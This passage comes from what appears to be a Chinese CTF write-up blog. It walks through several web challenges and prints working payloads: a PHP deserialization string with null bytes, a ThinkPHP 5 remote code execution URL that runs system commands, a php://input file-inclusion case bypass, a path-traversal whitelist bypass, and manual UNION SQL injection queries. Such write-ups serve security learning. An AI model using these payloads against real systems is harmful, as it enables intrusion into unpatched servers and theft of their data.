<p>属性值为10，但是”Demofile”只有8个字符，很明显缺了两个字符，但是却被省略了，猜测确了<strong>两个空字符</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上<span class="number">0</span>的前缀。字符串长度也包括所加前缀的长度</span><br><span class="line"></span><br><span class="line">所以也可以推测出Demofile是<span class="keyword">private</span>声明</span><br></pre></td></tr></table></figure></div>

<p>这里我一直卡住的<u>原因就是把空字符当作了空格</u></p>
<p>所以开始我是直接在D和f前加上空格，但是底下的base64编码提交url没有反应</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628214059503.png" alt="image-20220628214059503"></p>
<p>然后把decoder换成hex，发现空格是20（44是字母D，66是字母f）</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628233504338.png" alt="image-20220628233504338"></p>
<p>然后看了下面这个表，明白00才是空字符，空格和空字符不是同一个东西</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628213218629.png" alt="image-20220628213218629"></p>
<p>但是空字符无法复制，在复制时，空字符后的字符串会被截断，只复制了空字符前面的字符串</p>
<p>所以这里可以在hex里直接改，把20改成00</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628233851825.png" alt="image-20220628233851825"></p>
<p>然后下方的base64编码就可以了</p>
<p>访问</p>
<p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<p>得到flag</p>
<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-题目描述-16"><a href="#1-题目描述-16" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始界面如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630174402928.png" alt="image-20220630174402928"></p>
<p>（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）</p>
<p>这里可以先了解一下什么是<a href="../../../../2022/05/28/Web-study">rce</a>和该漏洞的成因</p>
<p>如果这里版本的thinkphp存在rce的漏洞，就可以通过指令获取flag</p>
<p>百度可知</p>
<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</code> </p>
<p>然后在Github上搜thinkphp得到<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630174951670.png" alt="image-20220630174951670"></p>
<p>尝试<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
<p>了解到最后的id处为命令执行语句输入处，用 find语句查看有没有flag文件</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630175318946.png" alt="image-20220630175318946"></p>
<p>得到的结果很乱，用F12整洁一些</p>
<p>最后行，看到flag文件夹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630175432667.png" alt="image-20220630175432667"></p>
<p>用cat显示出来</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
<p>得到flag</p>
<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-17"><a href="#1-题目描述-17" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题先了解<a href="../../../../2022/05/28/Web-study">php伪协议</a></p>
<p>看名字很清楚是到文件包含的题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>先分析一下函数</p>
<p><code>strstr()：</code><br><code>定义和用法：</code><br><code>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</code><br><code>区分大小写，stristr()函数不区分大小写</code><br><code>语法：</code><br><code>strstr(string,search,before_search)</code><br><code>string:必需，被搜索的字符串</code><br><code>search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符</code><br><code>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分</code></p>
<p><code>str_replace():</code><br><code>定义和用法：</code><br><code>以其它字符替换字符串中的一些字符（区分大小写）</code><br><code>语法：</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,必需，要查找的值</code><br><code>replace，必需，要替换的值</code><br><code>string，必需，被搜索的字符串</code><br><code>count，可选，替换次数</code></p>
<p>也就是说，如果page=的内容里有php://就会被替换为空，也就是过滤</p>
<p>但是看源码我们知道，它只过滤了小写，所以可以用大小写绕过，这里用的php://input</p>
<p>*这道题好像包括php://input，有5种方法，建议看看这篇文章<a href="https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1">Web_php_include总结五种解法大同小异</a></p>
<p><code>http://111.200.241.244:59492/?page=PHP://input</code></p>
<p>php://input读取POST数据， 我先用hackbar，发现没有反应</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626215410026.png" alt="image-20220626215410026"></p>
<p>看了一篇大佬的wp，说是被过滤了，所以不行</p>
<p>但这里可以用burp试试，得到flag文件名</p>
<p>fl4gisisish3r3.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626222916776.png" alt="image-20220626222916776"></p>
<p>显示fl4gisisish3r3.php内容</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626223253399.png" alt="image-20220626223253399"></p>
<p>得到flag</p>
<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>随便注</p>
<h3 id="2）wp-3"><a href="#2）wp-3" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题之前在buuctf上做过，考察堆叠注入，wp可以在<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>看一下</p>
<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-题目描述-19"><a href="#1-题目描述-19" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-4"><a href="#2）wp-4" class="headerlink" title="2）wp"></a>2）wp</h3><p>开始就只有一张图片，先看一下它源码</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220703104834305.png" alt="image-20220703104834305"></p>
<p>看到有一个source.php文件</p>
<p>访问<code>http://111.200.241.244:59132/source.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">//__FILE__常量返回文件的完整路径和文件名，高亮显示</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果不存在（isset()）或者不为字符串（is_string()）</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$page</span>.?字符串中出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$_page</span>字符串中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">//如果传的参数不是空的，并且是字符串，调用checkFile函数返回为true</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="comment">//对传来的参数进行包含</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//否则就输出图片</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>没有flag的线索，但看到一个hint.php文件</p>
<p>访问<code>http://111.200.241.244:59132/hint.php</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220703105453437.png" alt="image-20220703105453437"></p>
<p>知道了flag在ffffllllaaaagggg文件里</p>
<p>然后开始分析source.php代码（可以看看源码注释）</p>
<p>分析：</p>
<p>我们可以看到，关键在于 checkfile 函数，要让它返回为ture才能够实现文件包含，我们能控制的变量是file，<u>page变量实际是file变量的形参，由checkfile函数传过去</u>，也就是file变量要满足所有的if条件，才能返回ture而不是只显示图片</p>
<p>先分析checkfile函数里的四个if条件满足要求，避免执行return false</p>
<p>第一个if</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果不存在（isset()）或者不为字符串（is_string()）</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>因为语句里存在return false，所以要传入的<u>变量page存在且为字符串</u>，使得if语句为假，就不会执行return false，这个本身就满足，所以可以不考虑</p>
<p>第二个if</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="comment">//如果在白名单里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要我们传入的参数是source.php或者hint.php，满足whitelist(白名单)，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<p>第三个if，结合其前面代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">               <span class="variable">$page</span>,//要截取的字符串</span><br><span class="line">               <span class="number">0</span>,//起始位置</span><br><span class="line">               <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">               //返回？在<span class="variable">$page</span>.?字符串中出现的位置</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="comment">//如果在白名单里</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure></div>

<p>取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<p>第四个if</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$_page</span>字符串中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>先把参数进行url解码，然后和第三个if一样，取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<hr>
<p>至于</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure></div>

<p>只要file不为空，且为字符串即可，可以满足不考虑</p>
<p>所以只有下面两种</p>
<p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p>
<p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p>
<p>由PHP4-7的include函数的特性</p>
<p><img src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在payload上加上<code>/../../../../../../ffffllllaaaagggg</code>，这里可只加四层../即可，但也可以加多个返回上个目录，也可以依次试试</p>
<p>得到flag</p>
<p><strong>补充</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() 函数返回字符串的一部分，之前我们学过 <span class="title function_ invoke__">substr</span>() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 <span class="title function_ invoke__">mb_substr</span>()。</span><br><span class="line">实例</span><br><span class="line">从字符串中返回 <span class="string">&quot;菜鸟&quot;</span>：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;菜鸟教程&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 输出：菜鸟</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystack：要被检查的字符串。</span><br><span class="line">needle：要搜索的字符串。</span><br><span class="line">----------------</span><br><span class="line"> in_array函数功能检查数组中是否存在某个值</span><br></pre></td></tr></table></figure></div>

<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-题目描述-20"><a href="#1-题目描述-20" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-5"><a href="#2）wp-5" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等</p>
<p>开始先判断sql注入存在</p>
<p>输入**1’**，报错返回空白页面</p>
<p>然后判断字段数</p>
<p>当输入语句为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>返回空白页面，于是判断字段数为3</p>
<p>然后联合注入</p>
<p>先判断数据爆出口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703204402467.png" alt="image-20220703204402467"></p>
<p>得出数据在2，3位置处输出</p>
<p>然后按照标准sql注入流程即可</p>
<p>先看数据库和版本号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703204520282.png" alt="image-20220703204520282"></p>
<p>得到数据库名为<strong>news</strong>，MySQL版本为<strong>5.5.61</strong></p>
<p>然后查看news库的表名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&quot;news&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205326915.png" alt="image-20220703205326915"></p>
<p>得到两个表名<strong>news</strong>和<strong>secret_table</strong></p>
<p>flag肯定在<strong>secret_table</strong>里</p>
<p>查看<strong>secret_table</strong>列</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&quot;secret_table&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205526044.png" alt="image-20220703205526044"></p>
<p>看到fl4g，尝试查看其数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> fl4g  <span class="keyword">from</span> secret_table),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205758800.png" alt="image-20220703205758800"></p>
<p>得到flag</p>
<p>这里用sqlmap也可以，但还是试试手工注入更好</p>
<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-题目描述-21"><a href="#1-题目描述-21" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-6"><a href="#2）wp-6" class="headerlink" title="2）wp"></a>2）wp</h3><p>这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">原文链接</a></p>
<p>js源代码分析：</p>
<p>_等于一个$函数内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OPENSCAD"><figure class="iseeu highlight /openscad"><table><tr><td class="code"><pre><span class="line">_=&#x27;<span class="function"><span class="keyword">function</span> $<span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>

<p>一个输入框</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;c&quot;</span>&gt;&lt; <span class="attribute">onclick</span>=$()&gt;Ok&lt;/&gt;\&#x27;);</span><br></pre></td></tr></table></figure></div>

<pre><code>***核心代码：***
eval函数，这是执行函数；这里执行了_变量中的内容也就是&#39;&#39;中的内容，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来
这里可以使用浏览器打开，也可以将修改后的源代码放入控制台执行（放入控制台需要注意删除script前后标签）
</code></pre>
<p>浏览器打开： <img src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">   if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)</span><br><span class="line">         if(e.match(/e98aa$/)!=null)</span><br><span class="line">             if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">             var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">             var s=[t,n,r,i];</span><br><span class="line">             for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</span><br><span class="line">             &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> ο<span class="attr">nclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure></div>

<p>我们的终极目标是打印出</p>
